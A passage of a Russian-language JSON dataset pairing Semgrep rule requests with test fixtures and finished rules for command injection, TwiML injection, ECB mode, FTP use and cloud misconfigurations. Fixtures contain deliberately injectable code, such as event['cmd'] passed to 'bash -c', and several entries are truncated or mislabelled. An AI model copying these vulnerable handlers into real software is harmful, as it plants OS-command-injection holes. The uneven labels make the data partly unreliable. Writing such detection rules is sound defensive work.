    "input": "Требования:\n- Язык: python\n- Тип анализа: taint\n- CWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: dangerous-asyncio-create-exec.py\nimport asyncio\n\nclass AsyncEventLoop:\n    def __enter__(self):\n        self.loop = asyncio.new_event_loop()\n        asyncio.set_event_loop(self.loop)\n        return self.loop\n\n    def __exit__(self, *args):\n        self.loop.close()\n\ndef handler(event, context):\n    args = event['cmds']\n    program = args[0]\n    with AsyncEventLoop() as loop:\n        # ruleid: dangerous-asyncio-create-exec\n        proc = loop.run_until_complete(asyncio.subprocess.create_subprocess_exec(program, *args))\n        loop.run_until_complete(proc.communicate())\n\ndef lambda_handler(event, context):\n    program = \"bash\"\n    loop = asyncio.new_event_loop()\n    # ruleid: dangerous-asyncio-create-exec\n    proc = loop.run_until_complete(asyncio.subprocess.create_subprocess_exec(program, [program, \"-c\", event['cmd']]))\n    loop.run_until_complete(proc.communicate())\n\ndef ok_handler(event, context):\n    program = \"echo\"\n    loop = asyncio.new_event_loop()\n    # ok: dangerous-asyncio-create-exec\n    proc = loop.run_until_complete(asyncio.subprocess.create_subprocess_exec(program, [program, \"123\"]))\n    loop.run_until_complete(proc.communicate())  # Ограничиваем длину\n\nОпасные паттерны:\n• proc = loop.run_until_complete(asyncio.subprocess.create_subprocess_exec(program, [program, '-c', event['cmd']])\nloop.run_until_complete(proc.communicate())\n• proc = loop.run_until_complete(asyncio.create_subprocess_exec(program, event['arg'], event['command']))\nloop.run_until_complete(proc.communicate())\n\nБезопасные паттерны:  \n• proc = loop.run_until_complete(asyncio.subprocess.create_subprocess_exec(program, ['123']))\nloop.run_until_complete(proc.communicate())\n• proc = loop.run_until_complete(asyncio.create_subprocess_exec('ls'))\nloop.run_until_complete(proc.communicate())\n\nЛегенда аннотаций:\n- // ruleid:dangerous-asyncio-create-exec: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:dangerous-asyncio-create-exec: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: dangerous-asyncio-create-exec\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern: event\n    - pattern-inside: |\n        def $HANDLER(event, context):\n          ...\n  pattern-sinks:\n  - patterns:\n    - focus-metavariable: $CMD\n    - pattern-either:\n      - pattern: asyncio.create_subprocess_exec($PROG, $CMD, ...)\n      - pattern: asyncio.create_subprocess_exec($PROG, [$CMD, ...], ...)\n      - pattern: asyncio.subprocess.create_subprocess_exec($PROG, $CMD, ...)\n      - pattern: asyncio.subprocess.create_subprocess_exec($PROG, [$CMD, ...], ...)\n      - pattern: asyncio.create_subprocess_exec($PROG, \"=~/(sh|bash|ksh|csh|tcsh|zsh)/\", \"-c\",\n          $CMD, ...)\n      - pattern: asyncio.create_subprocess_exec($PROG, [\"=~/(sh|bash|ksh|csh|tcsh|zsh)/\", \"-c\",\n          $CMD, ...], ...)\n      - pattern: asyncio.subprocess.create_subprocess_exec($PROG, \"=~/(sh|bash|ksh|csh|tcsh|zsh)/\",\n          \"-c\", $CMD, ...)\n      - pattern: asyncio.subprocess.create_subprocess_exec($PROG, [\"=~/(sh|bash|ksh|csh|tcsh|zsh)/\",\n          \"-c\", $CMD, ...], ...)\n  message: >-\n    Detected 'create_subprocess_exec' function with argument tainted by `event` object. If\n    this data can be controlled by a malicious actor, it may be an instance of\n    command injection. Audit the use of this call to ensure it is not\n    controllable by an external resource. You may consider using\n    'shlex.escape()'.\n  metadata:\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"\n    asvs:\n      section: 'V5: Validation, Sanitization and Encoding Verification Requirements'\n      control_id: 5.3.8 OS Command Injection\n      control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x13-V5-Validation-Sanitization-Encoding.md#v53-output-encoding-and-injection-prevention-requirements\n      version: '4'\n    references:\n    - https://docs.python.org/3/library/asyncio-subprocess.html#asyncio.create_subprocess_exec\n    - https://docs.python.org/3/library/shlex.html\n    category: security\n    technology:\n    - python\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: HIGH\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages:\n  - python\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции create_subprocess_exec из модуля asyncio в Python, где аргумент команды ($CMD) может быть загрязнен данными из объекта event. Это представляет угрозу инъекции команд, если данные могут контролироваться злоумышленником. Правило проверяет наличие загрязненного источника (объект event) и сопоставляет его с вызовом create_subprocess_exec, используя различные шаблоны и регулярные выражения для проверки аргументов программы и команд.\n\n# Ключевые элементы:\n- ID: dangerous-asyncio-create-exec\n- Язык: python \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "dangerous-asyncio-create-exec",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: aws-subnet-has-public-ip-address\nОписание уязвимости: Resources in the AWS subnet are assigned a public IP address. Resources should not be exposed on the public internet, but should have access limited to consumers required for the function of your application. Set `map_public_ip_on_launch` to false so that resources are not publicly-accessible.\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-subnet-has-public-ip-address.tf\n# ruleid: aws-subnet-has-public-ip-address\nresource \"aws_subnet\" \"fail_1\" {\n  vpc_id                  = \"vpc-123456\"\n  map_public_ip_on_launch = true\n}\n\n# ruleid: aws-subnet-has-public-ip-address\nresource \"aws_default_subnet\" \"fail_2\" {\n  availability_zone = \"us-west-2a\"\n}\n\n# ruleid: aws-subnet-has-public-ip-address\nresource \"aws_default_subnet\" \"fail_3\" {\n  availability_zone       = \"us-west-2a\"\n  map_public_ip_on_launch = true\n}\n\n# ok: aws-subnet-has-public-ip-address\nresource \"aws_subnet\" \"pass_1\" {\n  vpc_id = \"vpc-123456\"\n}\n\n# ok: aws-subnet-has-public-ip-address\nresource \"aws_subnet\" \"pass_2\" {\n  vpc_id                  = \"vpc-123456\"\n  map_public_ip_on_launch = false\n}\n\n# ok: aws-subnet-has-public-ip-address\nresource \"aws_default_subnet\" \"pass_3\" {\n  availability_zone       = \"us-west-2a\"\n  map_public_ip_on_launch = false\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_subnet\" \"fail_1\" { vpc_id = \"vpc-123456\" map_public_ip_on_launch = true }\n• resource \"aws_default_subnet\" \"fail_2\" { availability_zone = \"us-west-2a\"}\n• resource \"aws_default_subnet\" \"fail_3\" { availability_zone = \"us-west-2a\" map_public_ip_on_launch = true }\n\nБезопасные паттерны:  \n• resource \"aws_subnet\" \"pass_1\" { vpc_id = \"vpc-123456\" }\n• resource \"aws_subnet\" \"pass_2\" { vpc_id = \"vpc-123456\" map_public_ip_on_launch = false }\n• resource \"aws_default_subnet\" \"pass_3\" { availability_zone = \"us-west-2a\" map_public_ip_on_launch = false }\n\nЛегенда аннотаций:\n- // ruleid:aws-subnet-has-public-ip-address: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-subnet-has-public-ip-address: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-subnet-has-public-ip-address\n  patterns:\n  - pattern-either:\n    - pattern: |\n        resource \"aws_subnet\" $ANYTHING {\n          ...\n          map_public_ip_on_launch = true\n          ...\n        }\n    - pattern: |\n        resource \"aws_default_subnet\" $ANYTHING {\n          ...\n        }\n  - pattern-not: |\n      resource \"aws_default_subnet\" $ANYTHING {\n        ...\n        map_public_ip_on_launch = false\n        ...\n      }\n  message: >-\n    Resources in the AWS subnet are assigned a public IP address. Resources\n    should not be exposed on the public internet, but should have access limited to\n    consumers required for the function of your application. Set `map_public_ip_on_launch`\n    to false so that resources are not publicly-accessible.\n  languages:\n  - hcl\n  severity: WARNING\n  metadata:\n    category: security\n    technology:\n    - terraform\n    - aws\n    owasp:\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control/\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/subnet#map_public_ip_on_launch\n    - https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/using-instance-addressing.html#concepts-public-addresses\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов AWS подсети, у которых установлен флаг 'map_public_ip_on_launch' равным true. Правило использует шаблон, который ищет ресурсы типа 'aws_subnet' или 'aws_default_subnet', где этот флаг установлен в true. Дополнительно проверяется отсутствие ресурсов 'aws_default_subnet', у которых флаг установлен в false, так как это может указывать на безопасную конфигурацию. Правило применимо только к файлам с расширением .tf, написанным на языке HCL.\n\n# Ключевые элементы:\n- ID: aws-subnet-has-public-ip-address\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-subnet-has-public-ip-address",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: insecure-cipher-mode-ecb\nОписание уязвимости: ECB (Electronic Code Book) is the simplest mode of operation for block ciphers.  Each block of data is encrypted in the same way.  This means identical plaintext blocks will always result in identical ciphertext blocks, which can leave significant patterns in the output. Use a different, cryptographically strong mode instead, such as GCM.\nCWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: insecure-cipher-mode-ecb.fixed.py\n# cf. https://github.com/PyCQA/bandit/blob/b1411bfb43795d3ffd268bef17a839dee954c2b1/examples/cipher-modes.py\n\nfrom cryptography.hazmat.primitives.ciphers.modes import CBC\nfrom cryptography.hazmat.primitives.ciphers.modes import ECB\n\n\n# Insecure mode\n# ruleid: insecure-cipher-mode-ecb\nmode = cryptography.hazmat.primitives.ciphers.modes.GCM(iv)\n\n# Secure cipher and mode\n# ok: insecure-cipher-mode-ecb\ncipher = AES.new(key, blockalgo.MODE_CTR, iv)\n\n# Secure mode\n# ok: insecure-cipher-mode-ecb\nmode = CBC(iv)\n\n\n// File: insecure-cipher-mode-ecb.py\n# cf. https://github.com/PyCQA/bandit/blob/b1411bfb43795d3ffd268bef17a839dee954c2b1/examples/cipher-modes.py\n\nfrom cryptography.hazmat.primitives.ciphers.modes import CBC\nfrom cryptography.hazmat.primitives.ciphers.modes import ECB\n\n\n# Insecure mode\n# ruleid: insecure-cipher-mode-ecb\nmode = ECB(iv)\n\n# Secure cipher and mode\n# ok: insecure-cipher-mode-ecb\ncipher = AES.new(key, blockalgo.MODE_CTR, iv)\n\n# Secure mode\n# ok: insecure-cipher-mode-ecb\nmode = CBC(iv)  # Ограничиваем длину\n\nОпасные паттерны:\n• mode = cryptography.hazmat.primitives.ciphers.modes.ECB(iv)\n• from cryptography.hazmat.primitives.ciphers.modes import ECB\nmode = ECB(iv)\n\nБезопасные паттерны:  \n• cipher = AES.new(key, blockalgo.MODE_CTR, iv)\n• mode = CBC(iv)\n\nЛегенда аннотаций:\n- // ruleid:insecure-cipher-mode-ecb: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-cipher-mode-ecb: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: insecure-cipher-mode-ecb\n  message: >-\n    ECB (Electronic Code Book) is the simplest mode of operation for block ciphers. \n    Each block of data is encrypted in the same way. \n    This means identical plaintext blocks will always result in identical ciphertext blocks, which can leave significant patterns in the output.\n    Use a different, cryptographically strong mode instead, such as GCM.\n  metadata:\n    source-rule-url: https://github.com/PyCQA/bandit/blob/d5f8fa0d89d7b11442fc6ec80ca42953974354c8/bandit/blacklists/calls.py#L101\n    cwe:\n    - 'CWE-327: Use of a Broken or Risky Cryptographic Algorithm'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    bandit-code: B305\n    references:\n    - https://cryptography.io/en/latest/hazmat/primitives/symmetric-encryption/#insecure-modes\n    - https://crypto.stackexchange.com/questions/20941/why-shouldnt-i-use-ecb-encryption\n    category: security\n    technology:\n    - cryptography\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: MEDIUM\n    functional-categories:\n    - crypto::search::mode::cryptography\n  severity: WARNING\n  languages:\n  - python\n  pattern: cryptography.hazmat.primitives.ciphers.modes.ECB($IV)\n  fix: cryptography.hazmat.primitives.ciphers.modes.GCM($IV)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования небезопасного режима шифрования ECB (Electronic Code Book) в Python-коде. Правило использует шаблон 'pattern' для поиска импорта модуля 'cryptography.hazmat.primitives.ciphers.modes.ECB', за которым следует вызов конструктора этого класса с параметром $IV. Опасный пример включает непосредственное создание объекта ECB, безопасный пример показывает использование другого безопасного режима шифрования, такого как CBC или GCM.\n\n# Ключевые элементы:\n- ID: insecure-cipher-mode-ecb\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "insecure-cipher-mode-ecb",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: slow-pattern-top-ellipsis\nОписание уязвимости: Using the ellipsis operator `...` at the top of the pattern drastically slows down the rule performance.\nCWE: \nТип анализа: search\nЯзык: yaml",
    "input": "Требования:\n- Язык: yaml\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: slow-pattern-top-ellipsis.test.yaml\nrules:\n  - id: javascript.phantom.security.audit.phantom-injection.phantom-injection\n    message: >-\n      If unverified user data can reach the `phantom` page methods it can result in Server-Side Request Forgery vulnerabilities\n    severity: WARNING\n    languages:\n      - javascript\n    patterns:\n      #ruleid: slow-pattern-top-ellipsis\n      - pattern: |\n          ...\n          $PHANTOM = require('phantom');\n          ...\n      - pattern-not-inside: |\n          var $INPUT = \"...\";\n          ...\n  - id: javascript.playwright.security.audit.playwright-evaluate-arg-injection.playwright-evaluate-arg-injection\n    message: >-\n      If unverified user data can reach the `evaluate` method it can result in Server-Side Request Forgery vulnerabilities\n    severity: WARNING\n    languages:\n      - javascript\n    patterns:\n      #ruleid: slow-pattern-top-ellipsis\n      - pattern-inside: |\n          ...\n          require('playwright');\n          ...\n      - pattern-either:\n          - pattern-inside: function $FUNC (...,$INPUT,...) {...}\n          - pattern-inside: function (...,$INPUT,...) {...}  # Ограничиваем длину\n\nОпасные паттерны:\n• ...\nrequire('phantom');\n• ...\nvar $USER_INPUT = '...'\n• ...\nfunction ($ARG,...){...}\n\nБезопасные паттерны:  \n• var $USER_INPUT = \"...\";\n• function ($ARG,...){...} body\n• require('playwright') ...\n\nЛегенда аннотаций:\n- // ruleid:slow-pattern-top-ellipsis: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:slow-pattern-top-ellipsis: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: slow-pattern-top-ellipsis\n  message: >-\n    Using the ellipsis operator `...` at the top of the pattern drastically slows down the rule performance.\n  severity: WARNING\n  metadata:\n    category: performance\n    technology:\n    - semgrep\n  languages:\n  - yaml\n\n  patterns:\n  - pattern-either:\n    - pattern-inside: |\n        pattern-inside: $X\n    - pattern-inside: |\n        pattern-not-inside: $X\n    - pattern-inside: |\n        pattern: $X\n    - pattern-inside: |\n        pattern-not: $X\n  - pattern-regex: \\|\\s*\\n\\s*\\.\\.\\.\\s*\\n[^\\n]*\\n\\s*\\.\\.\\.\n\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования оператора эллипсиса (`...`) в начале шаблона, что существенно замедляет производительность правила при поиске соответствий. Паттерн использует комбинацию операторов `pattern-inside`, `pattern-not-inside`, `pattern` и `pattern-not`. Правило ищет случаи, когда оператор эллипсиса находится сверху шаблона, независимо от того, является ли следующий элемент шаблона положительным или отрицательным условием.\n\n# Ключевые элементы:\n- ID: slow-pattern-top-ellipsis\n- Язык: yaml \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "slow-pattern-top-ellipsis",
      "language": "yaml",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: insecure-urlopen-ftp\nОписание уязвимости: Detected 'urllib.urlopen()' using 'ftp://'. This request will not be encrypted. Consider using SFTP instead. urllib does not support SFTP, so consider switching to a library which supports SFTP.\nCWE: CWE-319: Cleartext Transmission of Sensitive Information\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-319: Cleartext Transmission of Sensitive Information\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: insecure-urlopen-ftp.py\nfrom urllib.request import urlopen\n\ndef test1():\n    # ruleid: insecure-urlopen-ftp\n    urlopen(\"ftp://example.com\")\n\ndef test1_ok():\n    # ok: insecure-urlopen-ftp\n    urlopen(\"sftp://example.com\")\n\ndef test2():\n    # ruleid: insecure-urlopen-ftp\n    url = \"ftp://example.com\"\n    # ruleid: insecure-urlopen-ftp\n    urlopen(url)\n\ndef test2_ok():\n    # ok: insecure-urlopen-ftp\n    url = \"sftp://example.com\"\n    urlopen(url)\n\n# ruleid: insecure-urlopen-ftp\ndef test3(url = \"ftp://example.com\"):\n    urlopen(url)\n\n# ok: insecure-urlopen-ftp\ndef test3_ok(url = \"sftp://example.com\"):\n    urlopen(url)  # Ограничиваем длину\n\nОпасные паттерны:\n• urlopen(\"ftp://example.com\")\n• url = \"ftp://example.com\"; urlopen(url)\n• def test3(url = \"ftp://example.com\"): urlopen(url)\n\nБезопасные паттерны:  \n• urlopen(\"sftp://example.com\")\n• url = \"sftp://example.com\"; urlopen(url)\n• def test3_ok(url = \"sftp://example.com\"): urlopen(url)\n\nЛегенда аннотаций:\n- // ruleid:insecure-urlopen-ftp: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insecure-urlopen-ftp: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: insecure-urlopen-ftp\n  message: >-\n    Detected 'urllib.urlopen()' using 'ftp://'. This request will not be\n    encrypted. Consider using SFTP instead. urllib does not support SFTP,\n    so consider switching to a library which supports SFTP.\n  metadata:\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    cwe:\n    - 'CWE-319: Cleartext Transmission of Sensitive Information'\n    references:\n    - https://docs.python.org/3/library/urllib.request.html#urllib.request.urlopen\n    category: security\n    technology:\n    - urllib\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  severity: WARNING\n  languages: [python]\n  pattern-either:\n  - pattern: urllib.request.urlopen(\"=~/^[Ff][Tt][Pp]://.*/\", ...)\n  - pattern: |\n      $URL = \"=~/^[Ff][Tt][Pp]://.*/\"\n      ...\n      urllib.request.urlopen($URL, ...)\n  - pattern: |-\n      def $FUNC(..., $URL = \"=~/^[Ff][Tt][Pp]://.*/\", ...):\n        ...\n        urllib.request.urlopen($URL, ...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функции urlopen из библиотеки urllib в Python, где URL начинается с 'ftp://', что указывает на незащищенное FTP-соединение. Правило использует три шаблона: прямой вызов urlopen с 'ftp://' в строке URL, присвоение переменной URL с последующим вызовом urlopen и определение параметра URL внутри функции с использованием регулярного выражения для соответствия 'ftp://'. Шаблоны используют оператор pattern-either для охвата всех возможных случаев.\n\n# Ключевые элементы:\n- ID: insecure-urlopen-ftp\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "insecure-urlopen-ftp",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: twiml-injection\nОписание уязвимости: Using non-constant TwiML (Twilio Markup Language) argument when creating a Twilio conversation could allow the injection of additional TwiML commands\nCWE: CWE-91: XML Injection\nТип анализа: taint\nЯзык: python\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле\nСпособы санитации: определены в правиле",
    "input": "Требования:\n- Язык: python\n- Тип анализа: taint\n- CWE: CWE-91: XML Injection\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: twiml-injection.py\nfrom twilio.rest import Client\nimport html\nfrom xml.sax.saxutils import escape\n\nclient = Client(\"accountSid\", \"authToken\")\nXML = \"<Response><Say>{}</Say><Hangup/></Response>\"\n\n\ndef fstring(to: str, msg: str) -> None:\n    client.calls.create(\n        # ruleid: twiml-injection\n        twiml=f\"<Response><Say>{msg}</Say><Hangup/></Response>\",\n        to=to,\n        from_=\"555-555-5555\",\n    )\n\n\ndef format_const(to: str, msg: str) -> None:\n    twiml = XML.format(msg)\n    client.calls.create(\n        # ruleid: twiml-injection\n        twiml=twiml,\n        to=to,\n        from_=\"555-555-5555\",\n    )\n\n\ndef percent(to: str, msg: str) -> None:\n    client.calls.create(\n        # ruleid: twiml-injection\n        twiml=\"<Response><Say>%s</Say><Hangup/></Response>\" % msg,\n        to=to,\n        from_=\"555-555-5555\",\n    )\n\n\ndef format(to: str, msg: str) -> None:\n    client.calls.create(\n        # ruleid: twiml-injection\n        twiml=\"<Response><Say>{}</Say><Hangup/></Response>\".format(msg),\n        to=to,\n        from_=\"555-555-5555\",\n    )\n\n\ndef concat(to: str, msg: str) -> None:\n    client.calls.create(\n        # ruleid: twiml-injection\n        twiml=\"<Response><Say>\" + msg + \"</Say><Hangup/></Response>\",\n        to=to,\n        from_=\"555-555-5555\",\n    )\n\n\ndef safe(to: str, msg: str) -> None:\n    client.calls.create(\n        # ok: twiml-injection\n        twiml=\"<Response><Say>nsec</Say><Hangup/></Response>\",\n        to=to,\n        from_=\"555-555-5555\",\n    )\n\n\ndef also_safe(to: str, msg: str) -> None:\n    client.calls.create(\n        # ok: twiml-injection\n        twiml=\"<Response><Say>nsec</Say><Hangup/></Response>\",\n        to=to,\n        from_=f\"{1+2}34-323-1234\",\n    )\n\n\ndef html_escape(to: str, msg: str) -> None:\n    client.calls.create(\n        # ok: twiml-injection\n        twiml=\"<Response><Say>\" + html.escape(msg) + \"</Say><Hangup/></Response>\",\n        to=to,\n        from_=\"555-555-5555\",\n    )\n\n\ndef xml_escape(to: str, msg: str) -> None:\n      # Ограничиваем длину\n\nОпасные паттерны:\n• client.calls.create(twiml=f'<Response><Say>{msg}</Say><Hangup/></Response>', to=to, from_='555-555-5555')\n• client.calls.create(twiml='%s' % msg, to=to, from_='555-555-5555')\n• client.calls.create(twiml='<Response><Say>{}</Say><Hangup/></Response>'.format(msg), to=to, from_='555-555-5555')\n\nБезопасные паттерны:  \n• client.calls.create(twiml='<Response><Say>nsec</Say><Hangup/></Response>', to=to, from_='555-555-5555')\n• client.calls.create(twiml='<Response><Say>nsec</Say><Hangup/></Response>', to=to, from_='134-323-1234')\n• client.calls.create(twiml='<Response><Say>' + html.escape(msg) + '</Say><Hangup/></Response>', to=to, from_='555-555-5555')\n\nЛегенда аннотаций:\n- // ruleid:twiml-injection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:twiml-injection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: twiml-injection\n    languages: [python]\n    severity: WARNING\n    message: >-\n      Using non-constant TwiML (Twilio Markup Language) argument when creating a\n      Twilio conversation could allow the injection of additional TwiML commands\n    metadata:\n      cwe:\n      - \"CWE-91: XML Injection\"\n      owasp:\n      - \"A03:2021 - Injection\"\n      category: security\n      technology:\n      - python\n      - twilio\n      - twiml\n      confidence: MEDIUM\n      likelihood: HIGH\n      impact: MEDIUM\n      subcategory: vuln\n      references:\n      - https://codeberg.org/fennix/funjection\n    mode: taint\n    pattern-sources:\n    - pattern: |\n        f\"...\"\n    - pattern: |\n        \"...\" % ...\n    - pattern: |\n        \"...\".format(...)\n\n    - patterns:\n        - pattern: $ARG\n        - pattern-inside: |\n            def $F(..., $ARG, ...):\n                ...\n\n    pattern-sanitizers:\n    - pattern: xml.sax.saxutils.escape(...)\n    - pattern: html.escape(...)\n\n    pattern-sinks:\n    - patterns:\n      - pattern: |\n          $CLIENT.calls.create(..., twiml=$SINK, ...)\n\n      - focus-metavariable: $SINK\n\n\n# Логика правила:\n['Тип анализа: taint analysis', 'Источники (sources):', '1. Шаблон источника: форматированная строка с f-string (f\"...\")', '2. Шаблон источника: строка, переданная через оператор процент (%)...', '3. Шаблон источника: строка, переданная через метод .format(...)', 'Синки (sinks):', 'Шаблон синка: вызов метода calls.create() с аргументом twiml, который является метапеременной', 'Механизм сопоставления: поиск вызова функции или метода, содержащего шаблон источника и шаблон синка', 'Комбинация условий: ИЛИ между шаблонами источников и ИЛИ между шаблонами синков', 'Метапеременные: ARG — аргумент функции, SINK — переменная, используемая в вызове метода calls.create()']\n\n# Ключевые элементы:\n- ID: twiml-injection\n- Язык: python \n- Тип: v\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "twiml-injection",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "v",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения azure-appservice-identity\nОписание уязвимости: Ensure App Service Authentication is set on Azure App Service\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-appservice-identity.tf\n# fail\n# ruleid: azure-appservice-identity\nresource \"azurerm_app_service\" \"example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n}\n\n# pass\nresource \"azurerm_app_service\" \"example\" {\n  name                = \"example-app-service\"\n  location            = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_service_plan_id = azurerm_app_service_plan.example.id\n  client_cert_enabled          = true\n  identity {\n    type = \"UserAssigned\"\n    identity_ids = \"12345\"\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_app_service\" \"example\" { \n  name = \"example-app-service\"\n  location = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_servic\n• resource \"azurerm_app_service\" \"example\" { \n  name = \"example-app-service\"\n  location = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_servic\n\nБезопасные паттерны:  \n• resource \"azurerm_app_service\" \"example\" { \n  name = \"example-app-service\"\n  location = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_servic\n• resource \"azurerm_app_service\" \"example\" { \n  name = \"example-app-service\"\n  location = azurerm_resource_group.example.location\n  resource_group_name = azurerm_resource_group.example.name\n  app_servic\n\nЛегенда аннотаций:\n- // ruleid:azure-appservice-identity: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-appservice-identity: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: azure-appservice-identity\n  message: >-\n    Ensure App Service Authentication is set on Azure App Service\n  patterns:\n  - pattern: resource\n  - pattern-not-inside: |\n      resource \"azurerm_app_service\" \"...\" {\n      ...\n      client_cert_enabled = true\n      identity {\n        ...\n      }\n      ...\n      }\n  - pattern-inside: |\n      resource \"azurerm_app_service\" \"...\" {\n      ...\n      }\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - azure\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Azure App Service в конфигурациях Terraform (HCL). Оно проверяет наличие атрибута 'client_cert_enabled' и блока 'identity', который указывает на настроенную аутентификацию приложения службы Azure. Если эти атрибуты отсутствуют или не указаны корректно, правило отмечает код как опасный, так как это может привести к недостаточной гранулярности контроля доступа (CWE-1220). Правило использует шаблон поиска ресурса и исключения, где ресурс присутствует, но отсутствует необходимая конфигурация аутентификации.\n\n# Ключевые элементы:\n- ID: azure-appservice-identity\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-appservice-identity",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
